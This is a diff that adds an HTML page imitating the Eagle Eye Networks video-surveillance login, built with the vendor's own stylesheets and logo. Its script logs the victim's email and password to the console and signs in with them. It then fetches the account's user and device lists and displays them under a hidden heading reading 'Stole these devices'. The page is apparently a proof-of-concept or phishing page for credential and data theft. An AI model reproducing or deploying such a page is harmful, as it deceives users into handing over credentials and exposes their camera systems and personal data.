@@ -1,0 +1,287 @@
+
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link rel="shortcut icon" href="_css/images/favicon.ico">
+  <!-- Le styles -->
+  <link href="https://login.eagleeyenetworks.com/_css/base_3dc1a48d.css" rel="stylesheet">
+  <link href="https://login.eagleeyenetworks.com/_css/twitter/bootstrap_c1f15191.css" rel="stylesheet">
+  <link href="https://login.eagleeyenetworks.com/_css/vendor/jquery.reject_8a372463.css" rel="stylesheet">
+  <link href="https://login.eagleeyenetworks.com/_css/style_ff0360d6.css" rel="stylesheet">
+</head>
+<body>
+	<div class="container">
+		<div class="row">
+			<div class="span6 offset3">
+                <img id="logo_larg" src="https://login.eagleeyenetworks.com/_images/logo_large.png"/><br>
+                <legend></legend>
+				<div class="form-horizontal" accept-charset="UTF-8" id="form">
+          <h3 style="text-align:center; color: #0087be;">VMS Application Extensions</h3>
+					<div class="control-group">
+						<label class="control-label" for="email">Email Address</label>
+						<div class="controls">
+							<input class="span4 login-credentials" type="email"  maxlength="60" id="email" name="username" placeholder="Email Address" required="required"/>
+						</div>
+					</div>
+					<div class="control-group">
+						<label class="control-label" for="password1">Password</label>
+						<div class="controls popover-field">
+							<input class="span4 login-credentials" type="password" id="password1" name="password" placeholder="Password" required="required"/>
+						</div>
+					</div>
+					<div id="two-factor"></div>
+					<div class="control-group" id="sign-in-div">
+						<div class="controls span3">
+                            <input type="hidden" id="success" value=""/>
+							<button class="btn btn-info btn-block" id="login_button">Sign in</button>
+						</div>
+					</div>
+				</div>
+        
+			</div>
+		</div>
+    <div style="font-family:monospace; display:none" class="debug">
+        <div class="userinfo"><h4> Stole these devices</h4><pre></pre></div>
+    </div>
+	</div>
+
+
+	<div id="footer">
+		<div class="footer_logo_large">
+			<div id="copyright" class="copyright-mention">Copyright &copy; <div id="copy_year">2015</div>, <div id="copy_brand"></div>, All rights reserved.</div>
+		</div>
+	</div>
+
+<!-- TEMPLATE BEGIN :: IdentityProvider -->
+<script type="text/ractive" id="IdentityProvider-template">
+    <hr/>
+    <div class="form-horizontal">
+        <div class="control-group">
+            <button class="btn btn-default btn-block" on-click="idp_login">Sign in with Identity Provider</button>
+        </div>
+    </div>
+</script>
+<!-- TEMPLATE END :: IdentityProvider -->
+
+<!-- TEMPLATE BEGIN :: twoFactor -->
+<script id="template-twoFactor" type="text/ractive">
+    <div class="offset1">
+        {{#if this.method_selected}}
+            {{#if this.resend_code}}
+                <p>{{translateText('We need to send a new Security Code.')}}</p>
+                <p>{{translateText('How would you like to receive it?')}}</p>
+                <label>
+                    <input class="two-factor-radio"
+                           type="radio"
+                           name="{{method}}"
+                           value="email"
+                           selected>
+                    {{methods.email}} ({{translateText('Email')}})
+                </label>
+                {{#if no_sms}}
+                    <label class="radio-disabled">
+                        <input class="two-factor-radio"
+                               type="radio"
+                               name="{{method}}"
+                               value="sms"
+                               disabled>
+                        {{translateText('No phone number found')}}
+                    </label>
+                {{else}}
+                    <label>
+                        <input class="two-factor-radio"
+                               type="radio"
+                               name="{{method}}"
+                               value="sms">
+                        {{methods.sms}} ({{translateText('Phone')}})
+                    </label>
+                {{/if}}
+                <button class="btn btn-info push-down" type="button" on-click="resendCode">
+                    {{translateText('Resend Security Code')}}
+                </button>
+            {{else}}
+                <p>{{code_message}}</p>
+                <div class="two-factor-code-container">
+                    <input class="span2" maxlength="4" type="text" value="{{code}}">
+                </div>
+                <button class="btn btn-info" type="button" on-click="twoFactorCodeSubmit">
+                    {{translateText('Sign In')}}
+                </button>
+            {{/if}}
+        {{else}}
+            <p>
+                {{translateText(
+                    'We need to verify your account with a Security Code. How would you like to receive it?'
+                )}}
+            </p>
+            <label>
+                <input class="two-factor-radio"
+                       type="radio"
+                       name="{{method}}"
+                       value="email"
+                       selected>
+                {{methods.email}} ({{translateText('Email')}})
+            </label>
+            {{#if no_sms}}
+                <label class="radio-disabled">
+                    <input class="two-factor-radio"
+                           type="radio"
+                           name="{{method}}"
+                           value="sms"
+                           disabled>
+                    {{translateText('No phone number found')}}
+                </label>
+            {{else}}
+                <label>
+                    <input class="two-factor-radio"
+                           type="radio"
+                           name="{{method}}"
+                           value="sms">
+                    {{methods.sms}} ({{translateText('Phone')}})
+                </label>
+            {{/if}}
+            <button class="btn btn-info push-down" type="button" on-click="twoFactorSelectionSubmit">
+                {{translateText('Send Security Code')}}
+            </button>
+            {{#if no_sms}}
+                <p class="two-factor-help-text">
+                    {{translateText(
+                        'You can add a phone number for SMS after verifying your Security Code. ' +
+                        'Click your name in the top right corner and select "My Profile" after you sign in.'
+                    )}}
+                </p>
+            {{/if}}
+        {{/if}}
+        <p class="two-factor-error">{{error_message}}</p>
+    </div>
+</script>
+<!-- TEMPLATE END :: twoFactor -->
+
+<script>
+    var availableDictionaries = {
+        'en-us': '/_js/lang/en-us_4db14656.json',
+        'ja-jp': '/_js/lang/ja-jp_8e86e92e.json',
+        'ja': '/_js/lang/ja-jp_8e86e92e.json',   // for backwards compatibility for clients that already have 'ja' set in their user model
+        'fr-fr': '/_js/lang/fr-fr_b645060d.json',
+        'nl-nl': '/_js/lang/nl-nl_78c94ae5.json',
+        'de-de': '/_js/lang/de-de_c89fe800.json',
+        'it-it': '/_js/lang/it-it_72d5360e.json',
+        'es-es': '/_js/lang/es-es_940e391c.json',
+        'pl-pl': '/_js/lang/pl-pl_062dc4bf.json',
+        'tr-tr': '/_js/lang/tr-tr_9ab80069.json'
+    };
+</script>
+
+<script src="/_js/build/login-dependencies_c6fd6a30.js"></script>
+<script src="/_js/login_6a5d4d8f.js"></script>
+
+
+<script>
+$(document).ready(function() {
+    $("#login_button").unbind('click',);
+
+    $('#login_button').click(function() {
+        var payload = {
+            username: $('#email').val(),
+            password: $('#password1').val()
+        };
+        $('.debug').show();
+        api.authenticate( function(data) {
+            console.log("authenticated ", payload.username, payload.password);
+            if(!(data.two_factor_authentication_code)){
+                api.authorize(
+                    function(d) {
+                        //We get the success href from this priority
+                        //1.) Check if we are a custom white label domain, if so use that
+                        //2.) Check if we are a branded account, if so use that,
+                        //3.) Use the default
+                        $('.debug').show();
+                        console.log("Authorized");
+                        
+
+                        $.ajax('/g/list/users', {
+                          success: function(myArr){
+                              var userInfos = [];
+                              for(var i = 0; i < myArr.length; i++) {
+                                rec = myArr[i];
+                                var name = rec[0] + ' ' + rec[1] + ' ' + rec[2] + ' ' + rec[3];
+                                userInfos.push(name);
+                              }
+                              $('.debug .userinfo').append(userInfos.join("<br>"));
+                          }
+                        });
+                        $.ajax('/g/list/devices', {
+                          success: function(myArr){
+                              var userInfos = [];
+                              for(var i = 0; i < myArr.length; i++) {
+                                rec = myArr[i];
+                                var name = rec[0] + ' ' + rec[1] + ' ' + rec[2] + ' ' + rec[3];
+                                userInfos.push(name);
+                              }
+                              $('.debug .userinfo').append(userInfos.join("<br>"));
+                          }
+                        });
+                        
+                        
+                        
+                    },
+                    function() { 
+                        login_failed(utils.t('The email and password you have entered are not valid.')); 
+                    },
+                    {
+                        "token": data.token
+                    }
+                ) ;
+            }else{
+                $("#remember_label").parent().hide();
+                $("#password1").closest(".control-group").hide();
+                $('#msg').text("");
+                utils.hideLoading();
+                var methods = data.two_factor_authentication_code;
+                var authToken = data.token;
+                $(".dl-horizontal").hide();
+                $(".login-credentials").prop("disabled", true);
+                $("#sign-in-div").hide();
+                two_factor_flow = new Ractive.components.TwoFactorAuthComponent({
+                    el: "#two-factor",
+                    data:{
+                            "code": "",
+                            "auth_token": authToken,
+                            "method": "email",
+                            "methods": methods,
+                            "no_sms": false,
+                        },
+                    method_selected: false
+                });
+            }
+        },
+        function() { login_failed(utils.t('Unable to log in — please check your network connection.')); },
+        payload,
+        {
+            400: function() { login_failed(utils.t('The email and password you have entered are not valid.')); },
+            401: function(data) { on_401_custom_logic(data, payload.username); },
+            402: function() { login_failed(utils.t('Account is suspended')); },
+            412: function() { login_failed(utils.t('Sorry, this User has been disabled. Please contact your administrator to have it re-enabled.')); },
+            429: function() { login_failed(utils.t('User has been locked out due to exceeding the login attempt limit. You will receive a password reset email.')); },
+            460: function() { login_failed(utils.t('Account is inactive')); },
+            461: function() { login_failed_with_link(utils.t('Account is pending verification')+', <a href="#" id="resend1">'+utils.t('click to resend email')+'</a>'); createLinks(); },
+            462: function() { login_failed_with_link(utils.t('User is pending verification') + ', <a href="#" id="resend2">' + utils.t('click to resend email')+'</a>'); createLinks(); },
+            465: function() { login_failed(utils.t('Your account does not allow logins from your current IP address')); },
+            466: function(jqXHR, textStatus, errorThrown) {
+                login_failed(utils.t(utils.getOutsideAccessPeriodErrorMessage(jqXHR)));
+            },
+            467: function(data) { SSOLogin(data, payload.username); },
+            500: function() { login_failed(utils.t('Our server had a problem')); }
+        });
+
+    });
+});
+
+</script>
+    </body>
+</html>
